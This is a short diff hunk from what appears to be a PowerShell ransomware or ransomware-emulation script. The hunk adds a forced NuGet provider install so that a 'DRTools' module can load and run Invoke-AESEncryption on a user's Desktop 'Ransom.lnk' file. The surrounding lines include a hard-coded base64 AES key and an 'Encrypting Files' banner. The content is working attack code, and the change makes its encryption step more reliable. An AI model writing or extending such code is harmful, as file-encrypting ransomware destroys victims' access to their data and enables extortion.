@@ -636,6 +636,7 @@ Start-Sleep -S 5
 
 # Encrypt files
 Write-Host "[+] Encrypting Files" -ForegroundColor Green
+Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
 Install-Module -Name DRTools -Force
 $key = "SWxvdmVyYW5zb213YXJlPDM="
 Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom.lnk -warningaction 'silentlycontinue'
